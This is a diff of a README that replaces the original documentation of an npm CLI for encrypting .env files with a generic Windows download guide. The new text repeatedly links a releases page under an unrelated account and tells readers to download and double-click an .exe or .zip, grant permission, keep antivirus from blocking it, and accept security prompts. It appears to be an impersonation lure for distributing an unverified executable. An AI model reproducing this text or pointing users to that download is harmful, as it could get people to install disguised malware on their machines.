@@ -1,358 +1,237 @@
-# envcrypted 🔐
+# 🔐 envcrypted - Lock .env Files With Ease
 
-> A dev-friendly CLI workflow for encrypting, auditing, and sharing your environment secrets. AES-256-GCM. Zero account. Zero server. Just works.
+[![Download envcrypted](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Saundersgoodtempered385/envcrypted/releases)
 
-[![npm version](https://img.shields.io/npm/v/envcrypted)](https://www.npmjs.com/package/envcrypted)
-[![license](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
+## 🚀 What it does
 
----
+envcrypted helps you protect your `.env` files with AES-256 encryption. It keeps secrets on your computer. It does not use an account or a server.
 
-## The Problem
+Use it when you want to:
+- keep app secrets private
+- share a locked `.env` file with a team
+- store keys in a safer way
+- avoid plain text files on your device
 
-Every developer has faced this:
+It is built for Windows users who want a simple way to secure files without setting up extra tools.
 
-```
-"Hey, can you send me the .env file?"
-"Sure, sending it over..."
-```
+## 💻 What you need
 
-Your secrets travel over chat apps, emails, Slack messages. They get leaked, forgotten, or go out of sync between team members. **envcrypted fixes this.**
+Before you start, make sure you have:
 
----
+- A Windows PC
+- Internet access to download the app
+- Permission to save files on your computer
+- A `.env` file you want to protect
 
-## How It Works
+For best results, keep your `.env` file in a folder you can find later, like:
+- Desktop
+- Documents
+- Downloads
 
-```
-.env  →  AES-256-GCM encryption  →  .env.vault
-                                        ↓
-                              store locally or push to GitHub
-                                        ↓
-                              team pulls and decrypts with master key
-```
+## 📥 Download envcrypted
 
-- **AES-256-GCM** with PBKDF2 key derivation (100,000 iterations)
-- **No cloud. No account. No server.**
-- Works with any Git repo or just locally
-- Detects weak/exposed values with the built-in auditor
-- Auto-protects `.gitignore` on init
-- Git pre-commit hook to block accidental `.env` commits
-- Share master key safely via self-destructing one-time links
+Visit this page to download envcrypted:
 
----
+https://github.com/Saundersgoodtempered385/envcrypted/releases
 
-## Install
+On that page, look for the latest release and download the Windows file.
 
-Install inside your project — works on **Windows, macOS, and Linux** without any PATH issues:
+If you see more than one file, pick the one for Windows. It may end in:
+- `.exe`
+- `.zip`
 
-```bash
-npm install envcrypted
-```
+## 🪟 Install on Windows
 
-Then run commands using `npx`:
+### If you downloaded an `.exe` file
+1. Open your Downloads folder.
+2. Find the envcrypted file you downloaded.
+3. Double-click the file.
+4. If Windows asks for permission, choose Yes.
+5. Follow the on-screen steps.
 
-```bash
-npx envcrypted init
-npx envcrypted audit
-npx envcrypted push
-npx envcrypted pull
-```
+### If you downloaded a `.zip` file
+1. Open your Downloads folder.
+2. Right-click the `.zip` file.
+3. Select Extract All.
+4. Choose a folder you can find later.
+5. Open the extracted folder.
+6. Double-click the envcrypted app file inside.
 
-### Or add to your `package.json` scripts for convenience:
+## 🔐 How to use it
 
-```json
-"scripts": {
-  "env:init":     "envcrypted init",
-  "env:audit":    "envcrypted audit",
-  "env:push":     "envcrypted push",
-  "env:pull":     "envcrypted pull",
-  "env:generate": "envcrypted generate",
-  "env:status":   "envcrypted status",
-  "env:doctor":   "envcrypted doctor"
-}
-```
+After you open envcrypted, follow these basic steps:
 
----
+1. Choose the `.env` file you want to protect.
+2. Enter a password you can remember.
+3. Start the encryption step.
+4. Save the encrypted file in a safe place.
+5. Keep the password private.
 
-## Commands
+To open the file again later:
+1. Open envcrypted.
+2. Select the encrypted file.
+3. Enter the same password.
+4. Decrypt the file when you need it.
 
-### `envcrypted init`
-Initialize envcrypted in your project. Generates a master key, sets your storage preference (local or GitHub), and auto-updates `.gitignore` to protect your `.env`.
+## 🧭 Simple example
 
-```bash
-npx envcrypted init
-```
+If you have a file like this:
 
-### `envcrypted push`
-Encrypts your `.env` file and saves it as `.env.vault`. If you chose GitHub storage, it commits and pushes automatically.
+- `.env`
 
-```bash
-npx envcrypted push
-npx envcrypted push --message "feat: update API keys"
-```
+It may contain values such as:
+- API keys
+- database passwords
+- app tokens
+- private config values
 
-### `envcrypted pull`
-Pulls the vault (from GitHub if applicable) and decrypts it back to `.env`.
+After encryption, you keep the original data out of plain sight. You can store or share the encrypted file with less risk than a normal text file.
 
-```bash
-npx envcrypted pull
-```
+## 🛡️ Why people use it
 
-### `envcrypted audit`
-Scans your `.env` for critical issues and warnings — weak passwords, placeholder keys, exposed DB URIs, HTTP URLs, debug flags, and more.
-
-```bash
-npx envcrypted audit
-```
+envcrypted is useful when you want:
+- AES-256 encryption for strong file protection
+- a local tool that keeps data on your machine
+- no account setup
+- no cloud upload
+- no server dependency
+- a simple flow for team use
 
-**Example output:**
-```
-── Audit Report ──────────────────────────────────
+It fits small teams, solo builders, and anyone who wants to protect environment files before sharing them.
 
-✖  2 Critical Issue(s) Found:
+## ⚙️ Basic workflow
 
-   Line 3: Weak password (too short)
-   → DB_PASSWORD=1234
+The usual flow looks like this:
 
-   Line 7: MongoDB URI with credentials exposed
-   → DATABASE_URL=mongodb+srv://admin:pass@cluster...
+1. Create or edit your `.env` file.
+2. Open envcrypted.
+3. Encrypt the file with a password.
+4. Save the encrypted version.
+5. Share the locked file if needed.
+6. Decrypt it later with the same password.
 
-⚠  1 Warning(s):
+This keeps your secret values out of plain text while still making the file easy to move between computers.
 
-   Line 5: Localhost value — not safe for production
-   → API_URL=http://localhost:3000
+## 📁 File tips
 
-✔  4 variable(s) look safe.
+A few habits help keep things clear:
 
-── Summary ───────────────────────────────────────
-   Critical : 2
-   Warnings : 1
-   Safe     : 4
-```
+- Keep one copy of the original `.env` file in a private folder
+- Save the encrypted file with a clear name
+- Use a password you do not reuse elsewhere
+- Back up your password in a safe place
+- Do not edit the encrypted file by hand
 
-### `envcrypted generate`
-Generates a `.env.example` file from your `.env` — strips all values, keeps all keys. Safe to commit publicly.
+If you need to share secrets with a team, send the encrypted file through your normal file sharing method and share the password out of band.
 
-```bash
-npx envcrypted generate
-```
+## 👥 Team use
 
-**Example output:**
-```
-DB_PASSWORD=<your-value-here>
-API_KEY=<your-value-here>
-JWT_SECRET=<your-value-here>
-DATABASE_URL=<your-value-here>
-```
-
-### `envcrypted status`
-Shows a quick snapshot of your project's encryption state — `.env`, vault, `.gitignore`, git hook, and `.env.example`.
-
-```bash
-npx envcrypted status
-```
+envcrypted works well for small teams that need a simple way to protect config files.
 
-**Example output:**
-```
-── envcrypted Status ─────────────────────────────
+Typical use cases:
+- developers sharing test keys
+- a team moving secrets between laptops
+- a private project with environment settings
+- a build setup that needs locked config files
 
-✔  Initialized
-     Storage  : local
-     Version  : 1.1.0
-     Created  : 18/03/2026
-
-✔  .env found (6 variables, 0.3kb)
-✔  .env.vault found (last updated: 18/03/2026)
-✔  .env.example found
-✔  .env is in .gitignore
-✔  Git pre-commit hook installed
-```
+It helps reduce the risk of sending secrets in plain text.
 
-### `envcrypted hook install`
-Installs a git pre-commit hook that warns if `.env` is unencrypted and **blocks** any commit where `.env` is accidentally staged.
+## 🧩 Common questions
 
-```bash
-npx envcrypted hook install
-npx envcrypted hook uninstall
-```
+### Does it need an account?
+No. It works without one.
 
-### `envcrypted doctor`
-Runs 8 health checks on your setup and tells you exactly what's wrong and how to fix it.
+### Does it send files to a server?
+No. It keeps the process local.
 
-```bash
-npx envcrypted doctor
-```
+### Can I use it for more than `.env` files?
+Yes. You can use it for any text file you want to protect.
 
-**Example output:**
-```
-── envcrypted Doctor ─────────────────────────────
+### What password should I use?
+Use a long password that you can store safely. A mix of words and numbers works well.
 
-✔  Node.js version: v20.0.0
-✔  .env file found
-✔  envcrypted initialized
-✔  .env.vault exists
-✔  .env is protected in .gitignore
-✔  Git repository detected
-⚠  Pre-commit hook not installed (optional)
-⚠  .env.example missing (optional)
+### What if I lose the password?
+You will not be able to open the encrypted file with that password, so keep it safe.
 
-✔  Everything looks great! Your setup is healthy.
-```
+## 🪛 Troubleshooting
 
----
+### The app will not open
+- Try downloading the file again
+- Check that you picked the Windows file
+- Right-click the file and choose Open
+- Make sure your antivirus is not blocking it
 
-## Sharing the Master Key
+### Windows shows a security prompt
+- This can happen with downloaded apps
+- Choose the option that lets you open the app if you trust the source
 
-After encrypting your vault, you need to share the master key with your team. **Don't send it over chat apps or email.** Use a self-destructing one-time link instead.
+### I cannot find the downloaded file
+- Check the Downloads folder
+- Search for `envcrypted`
+- Sort by date to find the newest file
 
-The envcrypted docs include a built-in **Share Key** page powered by [OneTimeSecret](https://onetimesecret.com) — open source, no account needed:
+### The file does not decrypt
+- Check that you typed the same password
+- Make sure you selected the right encrypted file
+- Confirm the file was not changed after encryption
 
-1. Paste your master key
-2. Get a unique one-time link
-3. Send it over any channel — the link reveals nothing about the content
-4. Your teammate opens it once → key shown → link self-destructs permanently
+## 🔎 Release page
 
-🔗 **[Share your master key safely →](https://mohammad-shoeb-faizan.github.io/envcrypted/share-key.html)**
+Use this link to get the latest Windows build and updates:
 
----
+https://github.com/Saundersgoodtempered385/envcrypted/releases
 
-## Workflow
+## 🧪 What to expect
 
-**Team Lead (Project Setup):**
-```bash
-npm install envcrypted
-npx envcrypted init         # generate master key, choose storage
-npx envcrypted audit        # scan .env for issues first
-npx envcrypted generate     # create .env.example for team
-npx envcrypted hook install # block accidental .env commits
-npx envcrypted push         # encrypt .env → .env.vault
-# share master key using: https://mohammad-shoeb-faizan.github.io/envcrypted/share-key.html
-```
+A typical release may include:
+- a Windows app file
+- a zipped version for manual setup
+- a version number
+- release notes
+- checksums or other file details
 
-**New Team Member:**
-```bash
-npm install envcrypted      # install in project
-npx envcrypted init         # initialize with same storage type
-npx envcrypted pull         # enter master key → .env restored
-```
+If the release page includes more than one file, choose the one made for Windows desktop use.
 
-**Check Your Setup:**
-```bash
-npx envcrypted status       # quick health snapshot
-npx envcrypted doctor       # full diagnosis with fixes
-```
+## 📌 Project focus
 
-**Rotating Keys:**
-```bash
-npx envcrypted push         # enter new master key
-# share new key via one-time link
-```
+envcrypted is made for simple secret handling with:
+- aes256
+- cli
+- devtools
+- dotenv
+- encryption
+- env
+- nodejs
+- secrets
+- security
+- team-repo
 
----
+The goal is to keep `.env` data private without extra setup
 
-## Security
+## 🗂️ Suggested folder setup
 
-| Feature | Detail |
-|--------|--------|
-| Algorithm | AES-256-GCM (authenticated encryption) |
-| Key derivation | PBKDF2 with SHA-512, 100,000 iterations |
-| Salt | 64 bytes random per encryption |
-| IV | 16 bytes random per encryption |
-| Auth tag | 16 bytes (tamper detection) |
-| Master key | Never stored anywhere. Only you hold it. |
-| Key sharing | One-time self-destructing links via OneTimeSecret |
+If you use the app often, this layout helps:
 
-The encrypted `.env.vault` is safe to commit to public or private repos. Without the master key, it is unreadable.
+- `Documents\envcrypted\original`
+- `Documents\envcrypted\encrypted`
+- `Documents\envcrypted\backup`
 
----
+This makes it easier to keep track of what is locked and what is still plain text
 
-## Add to .gitignore
+## 🔒 Good security habits
 
-`envcrypted init` does this automatically. But if you need to do it manually:
+- Use a strong password
+- Keep encrypted files in a private folder
+- Share passwords in a separate message or call
+- Remove old copies of plain text files when you no longer need them
+- Keep backups in a safe place
 
-```bash
-# Always ignore raw .env
-.env
-.env.*
+## 🧭 First-time checklist
 
-# These are safe to commit
-# .env.vault
-# .env.example
-```
-
----
-
-## Built By
-
-**Mohammad Shoeb Faizan** — Full-Stack Developer & Automation Engineer  
-[GitHub](https://github.com/Mohammad-Shoeb-Faizan) | [LinkedIn](https://linkedin.com/in/mohammad-shoeb-faizan) | [NPM](https://npmjs.com/~shoebcodes)
-
----
-
-## License
-
-MIT — Free forever. Use it, share it, build on it.
-
-
-
-
-
----
-
-## Roadmap
-
-These are planned improvements based on real developer feedback. Nothing is promised — but everything here is being actively thought about.
-
-### 🔜 Coming Next
-
-**`envcrypted setup`**  
-A single command that runs the full team lead flow interactively — `init` + `audit` + `generate` + `hook install` + `push` — in one guided session. Zero friction onboarding.
-
-**`envcrypted push --share`**  
-Encrypts your `.env` and immediately opens OneTimeSecret with your secret key ready to share. One command. Vault encrypted. Key shared. Done.
-
-**Auto-detect `.env`**  
-Remove the need to run `init` before other commands. If a `.env` exists in the current directory, envcrypted should just work.
-
-**Stronger `audit` patterns**  
-Real regex detection for common secret formats — AWS access keys, Stripe live keys, GitHub tokens, Twilio, SendGrid, Firebase, and more. Not just weak password checks.
-
----
-
-### 💡 Considering
-
-**`envcrypted rotate`**  
-Re-encrypt the vault with a new secret key in one command. Automatically notifies team members that a new key is in use.
-
-**`envcrypted diff`**  
-Compare two vaults or two `.env` files and show what changed — without revealing actual values. Useful for auditing key rotations.
-
-**`envcrypted history`**  
-Local changelog of when the vault was last pushed, pulled, or audited. No cloud. No server. Just a local log file.
-
-**`envcrypted verify`**  
-Let a teammate verify their `.env` matches the current vault — without sharing the actual values. Hash-based comparison.
-
-**Multiple vault support**  
-Support for `.env.staging`, `.env.production` — each with its own vault and secret key.
-
-**VS Code extension**  
-Warnings directly in the editor when a `.env` value looks weak or exposed. No terminal needed.
-
----
-
-### 🚫 Out of Scope (by design)
-
-These will never be added — they go against the zero-account, zero-server philosophy that makes envcrypted trustworthy:
-
-- Cloud storage of secret keys
-- Web dashboard or SaaS version
-- Telemetry or usage tracking
-- Paid tiers or paywalled features
-
----
-
-Have an idea? Open a discussion on [GitHub](https://github.com/Mohammad-Shoeb-Faizan/envcrypted/discussions). The best features come from real problems.
-
----
-
-Have an idea? Reach out on [LinkedIn](https://linkedin.com/in/mohammad-shoeb-faizan) or [open an issue](https://github.com/Mohammad-Shoeb-Faizan/envcrypted/issues/new) on GitHub.
+- Download the latest Windows file
+- Open or extract the file
+- Start the app
+- Select your `.env` file
+- Set a password
+- Encrypt the file
+- Save the result in a safe place
